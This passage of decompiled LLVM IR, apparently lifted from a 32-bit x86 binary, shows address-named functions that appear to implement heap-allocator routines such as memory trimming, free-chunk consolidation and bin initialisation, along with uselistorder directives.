  br label %dec_label_pc_80540c9

dec_label_pc_80540c5:                             ; preds = %dec_label_pc_805407d, %dec_label_pc_8053ff5, %dec_label_pc_8053e8f
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_80540c9

dec_label_pc_80540c9:                             ; preds = %dec_label_pc_80540c1, %dec_label_pc_80540bc, %dec_label_pc_8054078, %dec_label_pc_8053fed, %dec_label_pc_80540c5
  store i32 %v2_8053dfe, i32* @eax, align 4
  store i32 %v2_8053dfe, i32* %stack_var_-60, align 4
  %v2_80540d2 = call i32 @function_8054a80(i32 %v2_8053dfe, i32 1)
  store i32 %v2_80540d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540d7

dec_label_pc_80540d7:                             ; preds = %dec_label_pc_8053de2, %dec_label_pc_8053dce, %dec_label_pc_80540c9
  br label %dec_label_pc_80540da

dec_label_pc_80540da:                             ; preds = %dec_label_pc_8053e1c, %dec_label_pc_80540d7
  %v0_80540dd = load i32, i32* @ebx, align 4
  store i32 %v0_80540dd, i32* %eax.global-to-local, align 4
  store i32 %v0_8053dbf, i32* @ebx, align 4
  store i32 %v0_8053dbe, i32* @esi, align 4
  store i32 %v0_8053dbd, i32* @edi, align 4
  store i32 %v0_8053dbc, i32* @ebp, align 4
  ret i32 %v0_80540dd

; uselistorder directives
  uselistorder i32 %v1_8054091, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8054065, { 1, 0, 2 }
  uselistorder i32 %v2_805404d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805402b, { 1, 0, 2 }
  uselistorder i32 %v1_8054006, { 1, 0, 2 }
  uselistorder i32 %v3_8054003, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053fc1, { 1, 0 }
  uselistorder i32 %v1_8053f27, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8053efb, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8053e9f, { 1, 0, 2 }
  uselistorder i32 %v3_8053eb2, { 0, 2, 1 }
  uselistorder i32 %v2_8053e6f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053e51, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053e49, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8053e3e, { 1, 0 }
  uselistorder i32 %v1_8053e2e, { 0, 2, 1 }
  uselistorder i32 %v0_8053e17, { 1, 0 }
  uselistorder i32 %v2_8053dfe, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 39, 42, 43, 44, 45, 0, 46, 47, 48, 49, 50 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_8054319, { 10, 9, 8, 7, 0, 3, 2, 1, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8053554, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_80540da, { 1, 0 }
  uselistorder label %dec_label_pc_80540d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80540c9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80540bc, { 1, 0 }
  uselistorder label %dec_label_pc_8054078, { 1, 0 }
  uselistorder label %dec_label_pc_8054065, { 1, 0 }
  uselistorder label %dec_label_pc_8053fed, { 1, 0 }
  uselistorder label %dec_label_pc_8053fa0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053f8c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053ee5, { 1, 0 }
  uselistorder label %dec_label_pc_8053e45, { 1, 0 }
}

define i32 @function_80540e4() local_unnamed_addr {
dec_label_pc_80540e4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80540eb = load i32, i32* @edx, align 4
  store i32 %v0_80540eb, i32* %ebp.global-to-local, align 4
  %v1_80540ed = add i32 %v0_80540eb, 860
  %v2_80540ed = inttoptr i32 %v1_80540ed to i32*
  %v3_80540ed = load i32, i32* %v2_80540ed, align 4
  store i32 %v3_80540ed, i32* %ecx.global-to-local, align 4
  %v1_80540f3 = add i32 %v0_80540eb, 44
  %v2_80540f3 = inttoptr i32 %v1_80540f3 to i32*
  %v3_80540f3 = load i32, i32* %v2_80540f3, align 4
  %v1_80540f6 = add i32 %v3_80540f3, 4
  %v2_80540f6 = inttoptr i32 %v1_80540f6 to i32*
  %v3_80540f6 = load i32, i32* %v2_80540f6, align 4
  %v1_80540f9 = and i32 %v3_80540f6, -4
  store i32 %v1_80540f9, i32* @esi, align 4
  %v1_80540fe = load i32, i32* @eax, align 4
  %v2_80540fe = add i32 %v3_80540ed, -17
  %v2_8054100 = add i32 %v2_80540fe, %v1_80540f9
  %v3_8054100 = sub i32 %v2_8054100, %v1_80540fe
  %div = udiv i32 %v3_8054100, %v3_80540ed
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8054100, %v3_80540ed
  store i32 %tmp10, i32* @edx, align 4
  %v1_8054108 = add i32 %div, -1
  %v4_805410b = mul i32 %v1_8054108, %v3_80540ed
  store i32 %v4_805410b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805410b, 1
  br i1 %tmp11, label %dec_label_pc_8054167, label %dec_label_pc_8054112

dec_label_pc_8054112:                             ; preds = %dec_label_pc_80540e4
  %v1_8054117 = call i32 @function_8055249(i32 0)
  store i32 %v1_8054117, i32* %edi.global-to-local, align 4
  %v0_805411e = load i32, i32* @esi, align 4
  store i32 %v0_805411e, i32* %eax.global-to-local, align 4
  %v1_8054120 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054120 = add i32 %v1_8054120, 44
  %v3_8054120 = inttoptr i32 %v2_8054120 to i32*
  %v4_8054120 = load i32, i32* %v3_8054120, align 4
  %v5_8054120 = add i32 %v4_8054120, %v0_805411e
  store i32 %v5_8054120, i32* %eax.global-to-local, align 4
  %v12_8054126 = icmp eq i32 %v1_8054117, %v5_8054120
  %v1_8054128 = icmp eq i1 %v12_8054126, false
  br i1 %v1_8054128, label %dec_label_pc_8054167, label %dec_label_pc_805412a

dec_label_pc_805412a:                             ; preds = %dec_label_pc_8054112
  %v1_805412d = sub i32 0, %v4_805410b
  store i32 %v1_805412d, i32* @ebx, align 4
  %v1_8054130 = call i32 @function_8055249(i32 %v1_805412d)
  store i32 %v1_8054130, i32* %eax.global-to-local, align 4
  %v1_805413c = call i32 @function_8055249(i32 0)
  store i32 %v1_805413c, i32* %eax.global-to-local, align 4
  %v10_8054144 = icmp eq i32 %v1_805413c, -1
  br i1 %v10_8054144, label %dec_label_pc_8054167, label %dec_label_pc_8054149

dec_label_pc_8054149:                             ; preds = %dec_label_pc_805412a
  %v0_8054149 = load i32, i32* %edi.global-to-local, align 4
  %v2_805414b = sub i32 %v0_8054149, %v1_805413c
  %v12_805414b = icmp eq i32 %v2_805414b, 0
  store i32 %v2_805414b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805414b, label %dec_label_pc_8054167, label %dec_label_pc_805414f

dec_label_pc_805414f:                             ; preds = %dec_label_pc_8054149
  %v0_805414f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805414f = add i32 %v0_805414f, 44
  %v2_805414f = inttoptr i32 %v1_805414f to i32*
  %v3_805414f = load i32, i32* %v2_805414f, align 4
  store i32 %v3_805414f, i32* %eax.global-to-local, align 4
  %v1_8054152 = add i32 %v0_805414f, 872
  %v2_8054152 = inttoptr i32 %v1_8054152 to i32*
  %v3_8054152 = load i32, i32* %v2_8054152, align 4
  %v5_8054152 = sub i32 %v3_8054152, %v2_805414b
  store i32 %v5_8054152, i32* %v2_8054152, align 4
  %v0_8054158 = load i32, i32* @esi, align 4
  %v1_8054158 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054158 = sub i32 %v0_8054158, %v1_8054158
  %v1_805415a = or i32 %v2_8054158, 1
  %v1_805415d = load i32, i32* %eax.global-to-local, align 4
  %v2_805415d = add i32 %v1_805415d, 4
  %v3_805415d = inttoptr i32 %v2_805415d to i32*
  store i32 %v1_805415a, i32* %v3_805415d, align 4
  br label %dec_label_pc_8054169

dec_label_pc_8054167:                             ; preds = %dec_label_pc_8054149, %dec_label_pc_805412a, %dec_label_pc_8054112, %dec_label_pc_80540e4
  br label %dec_label_pc_8054169

dec_label_pc_8054169:                             ; preds = %dec_label_pc_805414f, %dec_label_pc_8054167
  %storemerge = phi i32 [ 1, %dec_label_pc_805414f ], [ 0, %dec_label_pc_8054167 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805413c, { 1, 0, 2 }
  uselistorder i32 %v4_805410b, { 1, 2, 0 }
  uselistorder i32 %v3_80540ed, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8055249, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054169, { 1, 0 }
}

define i32 @function_8054171(i32* %arg1) local_unnamed_addr {
dec_label_pc_8054171:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8054172 = load i32, i32* @edi, align 4
  %v0_8054173 = load i32, i32* @esi, align 4
  %v0_8054174 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805417c = load i32, i32* %arg1, align 4
  store i32 %v2_805417c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8054183 = icmp eq i32 %v2_805417c, 0
  br i1 %v1_8054183, label %dec_label_pc_805429d.lr.ph, label %dec_label_pc_805418b

dec_label_pc_805429d.lr.ph:                       ; preds = %dec_label_pc_8054171
  %v3_80542a1 = add i32 %tmp20, 44
  br label %dec_label_pc_805429d

dec_label_pc_805418b:                             ; preds = %dec_label_pc_8054171
  %v1_805418f = and i32 %v2_805417c, -3
  store i32 %v1_805418f, i32* %arg1, align 4
  %v1_8054194 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805419f = add i32 %tmp20, 4
  store i32 %v1_805419f, i32* %eax.global-to-local, align 4
  %v2_80541aa = load i32, i32* %arg1, align 4
  %v2_80541b0 = udiv i32 %v2_80541aa, 8
  %v2_80541b3 = mul nuw i32 %v2_80541b0, 4
  %v3_80541b3 = add i32 %tmp20, -4
  %v4_80541b3 = add i32 %v3_80541b3, %v2_80541b3
  store i32 %v4_80541b3, i32* %eax.global-to-local, align 4
  %v2_805427a = add i32 %tmp20, 44
  %v3_805427a = inttoptr i32 %v2_805427a to i32*
  %v1_805424d = add i32 %tmp20, 60
  %v2_805424d = inttoptr i32 %v1_805424d to i32*
  br label %dec_label_pc_80541bb

dec_label_pc_80541bb:                             ; preds = %dec_label_pc_8054293, %dec_label_pc_805418b
  %v0_80541c9 = phi i32 [ %v1_805419f, %dec_label_pc_805418b ], [ %v4_8054293, %dec_label_pc_8054293 ]
  store i32 %v0_80541c9, i32* %eax.global-to-local, align 4
  %v1_80541bf = inttoptr i32 %v0_80541c9 to i32*
  %v2_80541bf = load i32, i32* %v1_80541bf, align 4
  store i32 %v2_80541bf, i32* @ecx, align 4
  %v1_80541c1 = icmp eq i32 %v2_80541bf, 0
  br i1 %v1_80541c1, label %dec_label_pc_8054289, label %dec_label_pc_80541c9

dec_label_pc_80541c9:                             ; preds = %dec_label_pc_80541bb
  store i32 0, i32* %v1_80541bf, align 4
  %v0_80541cf.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80541cf

dec_label_pc_80541cf:                             ; preds = %dec_label_pc_805427d, %dec_label_pc_80541c9
  %v0_80541ec = phi i32 [ %v3_80541cf, %dec_label_pc_805427d ], [ %v0_80541cf.pre, %dec_label_pc_80541c9 ]
  %v1_80541cf = add i32 %v0_80541ec, 8
  %v2_80541cf = inttoptr i32 %v1_80541cf to i32*
  %v3_80541cf = load i32, i32* %v2_80541cf, align 4
  store i32 %v3_80541cf, i32* %edx.global-to-local, align 4
  %v1_80541d6 = add i32 %v0_80541ec, 4
  %v2_80541d6 = inttoptr i32 %v1_80541d6 to i32*
  %v3_80541d6 = load i32, i32* %v2_80541d6, align 4
  store i32 %v3_80541d6, i32* %eax.global-to-local, align 4
  %v1_80541db = and i32 %v3_80541d6, -2
  store i32 %v1_80541db, i32* @edi, align 4
  %v2_80541de = urem i32 %v3_80541d6, 2
  %v3_80541de = icmp eq i32 %v2_80541de, 0
  %v2_80541e0 = add i32 %v1_80541db, %v0_80541ec
  store i32 %v2_80541e0, i32* @ebx, align 4
  %v1_80541e3 = add i32 %v2_80541e0, 4
  %v2_80541e3 = inttoptr i32 %v1_80541e3 to i32*
  %v3_80541e3 = load i32, i32* %v2_80541e3, align 4
  store i32 %v3_80541e3, i32* %edx.global-to-local, align 4
  %v1_80541ea = icmp eq i1 %v3_80541de, false
  br i1 %v1_80541ea, label %dec_label_pc_805420c, label %dec_label_pc_80541ec

dec_label_pc_80541ec:                             ; preds = %dec_label_pc_80541cf
  %v1_80541ec = inttoptr i32 %v0_80541ec to i32*
  %v2_80541ec = load i32, i32* %v1_80541ec, align 4
  store i32 %v2_80541ec, i32* %ebp.global-to-local, align 4
  %v2_80541f0 = sub i32 %v0_80541ec, %v2_80541ec
  store i32 %v2_80541f0, i32* %eax.global-to-local, align 4
  %v1_80541f2 = add i32 %v2_80541f0, 8
  %v2_80541f2 = inttoptr i32 %v1_80541f2 to i32*
  %v3_80541f2 = load i32, i32* %v2_80541f2, align 4
  store i32 %v3_80541f2, i32* @esi, align 4
  %v1_80541f5 = add i32 %v2_80541f0, 12
  %v2_80541f5 = inttoptr i32 %v1_80541f5 to i32*
  %v3_80541f5 = load i32, i32* %v2_80541f5, align 4
  store i32 %v3_80541f5, i32* %edx.global-to-local, align 4
  %v1_80541f8 = add i32 %v3_80541f2, 12
  %v2_80541f8 = inttoptr i32 %v1_80541f8 to i32*
  %v3_80541f8 = load i32, i32* %v2_80541f8, align 4
  store i32 %v3_80541f8, i32* @ecx, align 4
  %v12_80541fb = icmp eq i32 %v3_80541f8, %v2_80541f0
  %v1_80541fd = icmp eq i1 %v12_80541fb, false
  br i1 %v1_80541fd, label %dec_label_pc_805423c, label %dec_label_pc_80541ff

dec_label_pc_80541ff:                             ; preds = %dec_label_pc_80541ec
  %v1_80541ff = add i32 %v3_80541f5, 8
  %v2_80541ff = inttoptr i32 %v1_80541ff to i32*
  %v3_80541ff = load i32, i32* %v2_80541ff, align 4
  %v15_80541ff = icmp eq i32 %v3_80541ff, %v3_80541f8
  %v1_8054202 = icmp eq i1 %v15_80541ff, false
  br i1 %v1_8054202, label %dec_label_pc_805423c, label %dec_label_pc_8054204

dec_label_pc_8054204:                             ; preds = %dec_label_pc_80541ff
  %v2_8054204 = add i32 %v2_80541ec, %v1_80541db
  store i32 %v2_8054204, i32* @edi, align 4
  store i32 %v3_80541f5, i32* %v2_80541f8, align 4
  %v0_8054209 = load i32, i32* @esi, align 4
  %v1_8054209 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054209 = add i32 %v1_8054209, 8
  %v3_8054209 = inttoptr i32 %v2_8054209 to i32*
  store i32 %v0_8054209, i32* %v3_8054209, align 4
  %v0_8054217.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805420c

dec_label_pc_805420c:                             ; preds = %dec_label_pc_80541cf, %dec_label_pc_8054204
  %v1_8054220 = phi i32 [ %v2_80541e0, %dec_label_pc_80541cf ], [ %v0_8054217.pre, %dec_label_pc_8054204 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8054214 = and i32 %v3_80541e3, -4
  store i32 %v1_8054214, i32* %ebp.global-to-local, align 4
  %v4_8054217 = load i32, i32* %v3_805427a, align 4
  %v15_8054217 = icmp eq i32 %v1_8054220, %v4_8054217
  br i1 %v15_8054217, label %dec_label_pc_805426d, label %dec_label_pc_805421c

dec_label_pc_805421c:                             ; preds = %dec_label_pc_805420c
  %v2_805421c = add i32 %v1_8054220, 4
  %v3_805421c = add i32 %v2_805421c, %v1_8054214
  %v4_805421c = inttoptr i32 %v3_805421c to i32*
  %v5_805421c = load i32, i32* %v4_805421c, align 4
  store i32 %v5_805421c, i32* %eax.global-to-local, align 4
  %v3_8054220 = inttoptr i32 %v2_805421c to i32*
  store i32 %v1_8054214, i32* %v3_8054220, align 4
  %v0_8054223 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054223 = urem i32 %v0_8054223, 2
  %v2_8054223 = icmp eq i32 %v1_8054223, 0
  store i32 %v1_8054223, i32* %eax.global-to-local, align 4
  %v1_8054228 = icmp eq i1 %v2_8054223, false
  br i1 %v1_8054228, label %dec_label_pc_8054249, label %dec_label_pc_805422a

dec_label_pc_805422a:                             ; preds = %dec_label_pc_805421c
  %v0_805422a = load i32, i32* @ebx, align 4
  %v1_805422a = add i32 %v0_805422a, 8
  %v2_805422a = inttoptr i32 %v1_805422a to i32*
  %v3_805422a = load i32, i32* %v2_805422a, align 4
  store i32 %v3_805422a, i32* @edx, align 4
  %v1_805422d = add i32 %v0_805422a, 12
  %v2_805422d = inttoptr i32 %v1_805422d to i32*
  %v3_805422d = load i32, i32* %v2_805422d, align 4
  store i32 %v3_805422d, i32* %eax.global-to-local, align 4
  %v1_8054230 = add i32 %v3_805422a, 12
  %v2_8054230 = inttoptr i32 %v1_8054230 to i32*
  %v3_8054230 = load i32, i32* %v2_8054230, align 4
  store i32 %v3_8054230, i32* @esi, align 4
  %v12_8054233 = icmp eq i32 %v3_8054230, %v0_805422a
  %v1_8054235 = icmp eq i1 %v12_8054233, false
  br i1 %v1_8054235, label %dec_label_pc_805423c, label %dec_label_pc_8054237

dec_label_pc_8054237:                             ; preds = %dec_label_pc_805422a
  %v1_8054237 = add i32 %v3_805422d, 8
  %v2_8054237 = inttoptr i32 %v1_8054237 to i32*
  %v3_8054237 = load i32, i32* %v2_8054237, align 4
  %v15_8054237 = icmp eq i32 %v3_8054237, %v3_8054230
  br i1 %v15_8054237, label %dec_label_pc_8054241, label %dec_label_pc_805423c

dec_label_pc_805423c:                             ; preds = %dec_label_pc_8054237, %dec_label_pc_805422a, %dec_label_pc_80541ff, %dec_label_pc_80541ec
  %v0_805423c = call i32 @function_80544b5()
  store i32 %v0_805423c, i32* %eax.global-to-local, align 4
  %v1_8054243.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054241

dec_label_pc_8054241:                             ; preds = %dec_label_pc_8054237, %dec_label_pc_805423c
  %v1_8054243 = phi i32 [ %v3_805422a, %dec_label_pc_8054237 ], [ %v1_8054243.pre, %dec_label_pc_805423c ]
  %v0_8054243 = phi i32 [ %v3_805422d, %dec_label_pc_8054237 ], [ %v0_805423c, %dec_label_pc_805423c ]
  %v0_8054241 = load i32, i32* @edi, align 4
  %v1_8054241 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054241 = add i32 %v1_8054241, %v0_8054241
  store i32 %v2_8054241, i32* @edi, align 4
  %v2_8054243 = add i32 %v1_8054243, 12
  %v3_8054243 = inttoptr i32 %v2_8054243 to i32*
  store i32 %v0_8054243, i32* %v3_8054243, align 4
  %v0_8054246 = load i32, i32* @edx, align 4
  %v1_8054246 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054246 = add i32 %v1_8054246, 8
  %v3_8054246 = inttoptr i32 %v2_8054246 to i32*
  store i32 %v0_8054246, i32* %v3_8054246, align 4
  br label %dec_label_pc_8054249

dec_label_pc_8054249:                             ; preds = %dec_label_pc_805421c, %dec_label_pc_8054241
  store i32 %v1_8054194, i32* %eax.global-to-local, align 4
  %v3_805424d = load i32, i32* %v2_805424d, align 4
  store i32 %v3_805424d, i32* @edx, align 4
  %v0_8054250 = load i32, i32* @ecx, align 4
  store i32 %v0_8054250, i32* %v2_805424d, align 4
  %v0_8054253 = load i32, i32* @edi, align 4
  %v1_8054255 = or i32 %v0_8054253, 1
  store i32 %v1_8054255, i32* %eax.global-to-local, align 4
  %v0_8054258 = load i32, i32* @ecx, align 4
  %v1_8054258 = load i32, i32* @edx, align 4
  %v2_8054258 = add i32 %v1_8054258, 12
  %v3_8054258 = inttoptr i32 %v2_8054258 to i32*
  store i32 %v0_8054258, i32* %v3_8054258, align 4
  %v0_805425b = load i32, i32* %eax.global-to-local, align 4
  %v1_805425b = load i32, i32* @ecx, align 4
  %v2_805425b = add i32 %v1_805425b, 4
  %v3_805425b = inttoptr i32 %v2_805425b to i32*
  store i32 %v0_805425b, i32* %v3_805425b, align 4
  store i32 %v1_8054194, i32* %eax.global-to-local, align 4
  %v0_8054262 = load i32, i32* @edx, align 4
  %v1_8054262 = load i32, i32* @ecx, align 4
  %v2_8054262 = add i32 %v1_8054262, 8
  %v3_8054262 = inttoptr i32 %v2_8054262 to i32*
  store i32 %v0_8054262, i32* %v3_8054262, align 4
  %v0_8054265 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054265 = load i32, i32* @ecx, align 4
  %v2_8054265 = add i32 %v1_8054265, 12
  %v3_8054265 = inttoptr i32 %v2_8054265 to i32*
  store i32 %v0_8054265, i32* %v3_8054265, align 4
  %v0_8054268 = load i32, i32* @edi, align 4
  %v1_8054268 = load i32, i32* @ecx, align 4
  %v3_8054268 = add i32 %v1_8054268, %v0_8054268
  %v4_8054268 = inttoptr i32 %v3_8054268 to i32*
  store i32 %v0_8054268, i32* %v4_8054268, align 4
  br label %dec_label_pc_805427d

dec_label_pc_805426d:                             ; preds = %dec_label_pc_805420c
  %v0_805426d = load i32, i32* @edi, align 4
  %v2_805426d = add i32 %v0_805426d, %v1_8054214
  %v1_8054270 = or i32 %v2_805426d, 1
  store i32 %v1_8054270, i32* %eax.global-to-local, align 4
  %v1_8054273 = load i32, i32* @ecx, align 4
  %v2_8054273 = add i32 %v1_8054273, 4
  %v3_8054273 = inttoptr i32 %v2_8054273 to i32*
  store i32 %v1_8054270, i32* %v3_8054273, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805427a = load i32, i32* @ecx, align 4
  store i32 %v0_805427a, i32* %v3_805427a, align 4
  br label %dec_label_pc_805427d

dec_label_pc_805427d:                             ; preds = %dec_label_pc_8054249, %dec_label_pc_805426d
  store i32 %v3_80541cf, i32* @ecx, align 4
  %v1_8054281 = icmp eq i32 %v3_80541cf, 0
  %v1_8054283 = icmp eq i1 %v1_8054281, false
  br i1 %v1_8054283, label %dec_label_pc_80541cf, label %dec_label_pc_8054289

dec_label_pc_8054289:                             ; preds = %dec_label_pc_805427d, %dec_label_pc_80541bb
  %v15_805428d = icmp eq i32 %v0_80541c9, %v4_80541b3
  br i1 %v15_805428d, label %dec_label_pc_8054311, label %dec_label_pc_8054293

dec_label_pc_8054293:                             ; preds = %dec_label_pc_8054289
  %v4_8054293 = add i32 %v0_80541c9, 4
  br label %dec_label_pc_80541bb

dec_label_pc_805429d:                             ; preds = %dec_label_pc_805429d.lr.ph, %dec_label_pc_805429d
  %v1_80542a1 = phi i32 [ 1, %dec_label_pc_805429d.lr.ph ], [ %v0_80542ac, %dec_label_pc_805429d ]
  %v2_80542a1 = mul i32 %v1_80542a1, 8
  %v4_80542a1 = add i32 %v3_80542a1, %v2_80542a1
  store i32 %v4_80542a1, i32* %eax.global-to-local, align 4
  %v1_80542a5 = add i32 %v1_80542a1, 1
  store i32 %v1_80542a5, i32* %edx.global-to-local, align 4
  %v2_80542a6 = add i32 %v4_80542a1, 12
  %v3_80542a6 = inttoptr i32 %v2_80542a6 to i32*
  store i32 %v4_80542a1, i32* %v3_80542a6, align 4
  %v0_80542a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80542a9 = add i32 %v0_80542a9, 8
  %v3_80542a9 = inttoptr i32 %v2_80542a9 to i32*
  store i32 %v0_80542a9, i32* %v3_80542a9, align 4
  %v0_80542ac = load i32, i32* %edx.global-to-local, align 4
  %v7_80542af = icmp sgt i32 %v0_80542ac, 95
  br i1 %v7_80542af, label %dec_label_pc_80542b1, label %dec_label_pc_805429d

dec_label_pc_80542b1:                             ; preds = %dec_label_pc_805429d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80542b5 = add i32 %tmp20, 864
  %v2_80542b5 = inttoptr i32 %v1_80542b5 to i32*
  %v3_80542b5 = load i32, i32* %v2_80542b5, align 4
  %v4_80542b5 = or i32 %v3_80542b5, 1
  store i32 %v4_80542b5, i32* %v2_80542b5, align 4
  %v0_80542bc = load i32, i32* %eax.global-to-local, align 4
  %v1_80542bc = add i32 %v0_80542bc, 840
  %v2_80542bc = inttoptr i32 %v1_80542bc to i32*
  store i32 0, i32* %v2_80542bc, align 4
  %v0_80542c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80542c6 = add i32 %v0_80542c6, 852
  %v2_80542c6 = inttoptr i32 %v1_80542c6 to i32*
  store i32 65536, i32* %v2_80542c6, align 4
  %v0_80542d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80542d0 = add i32 %v0_80542d0, 844
  %v2_80542d0 = inttoptr i32 %v1_80542d0 to i32*
  store i32 262144, i32* %v2_80542d0, align 4
  %v0_80542da = load i32, i32* %eax.global-to-local, align 4
  %v1_80542da = add i32 %v0_80542da, 836
  %v2_80542da = inttoptr i32 %v1_80542da to i32*
  store i32 262144, i32* %v2_80542da, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_80542eb = load i32, i32* %arg1, align 4
  %v1_80542ed = urem i32 %v2_80542eb, 4
  %v1_80542f0 = or i32 %v1_80542ed, 72
  store i32 %v1_80542f0, i32* %arg1, align 4
  %v0_80542f5 = load i32, i32* @edx, align 4
  %v1_80542f7 = add i32 %v0_80542f5, 52
  store i32 %v1_80542f7, i32* %eax.global-to-local, align 4
  %v2_80542fa = add i32 %v0_80542f5, 44
  %v3_80542fa = inttoptr i32 %v2_80542fa to i32*
  store i32 %v1_80542f7, i32* %v3_80542fa, align 4
  %v1_80542ff = call i32 @function_80548f9(i32 30)
  store i32 %v1_80542ff, i32* %eax.global-to-local, align 4
  %v2_805430b = add i32 %tmp20, 860
  %v3_805430b = inttoptr i32 %v2_805430b to i32*
  store i32 %v1_80542ff, i32* %v3_805430b, align 4
  br label %dec_label_pc_8054311

dec_label_pc_8054311:                             ; preds = %dec_label_pc_8054289, %dec_label_pc_80542b1
  store i32 %v0_8054174, i32* @ebx, align 4
  store i32 %v0_8054173, i32* @esi, align 4
  store i32 %v0_8054172, i32* @edi, align 4
  %v0_8054318 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8054318

; uselistorder directives
  uselistorder i32 %v0_80542ac, { 1, 0 }
  uselistorder i32 %v0_80542a9, { 1, 0 }
  uselistorder i32 %v1_80542a1, { 1, 0 }
  uselistorder i32 %v0_8054268, { 1, 0 }
  uselistorder i32 %v1_8054223, { 1, 0 }
  uselistorder i32 %v2_805421c, { 1, 0 }
  uselistorder i32 %v1_8054214, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054220, { 1, 0 }
  uselistorder i32 %v3_80541cf, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80541ec, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80541c9, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805427a, { 1, 0 }
  uselistorder i32 %v1_8054194, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_8054311, { 1, 0 }
  uselistorder label %dec_label_pc_805429d, { 1, 0 }
  uselistorder label %dec_label_pc_805427d, { 1, 0 }
  uselistorder label %dec_label_pc_8054249, { 1, 0 }
  uselistorder label %dec_label_pc_8054241, { 1, 0 }
  uselistorder label %dec_label_pc_805420c, { 1, 0 }
}

define i32 @function_8054319(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054319:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8054319 = load i32, i32* @ebp, align 4
  %v0_805431a = load i32, i32* @edi, align 4
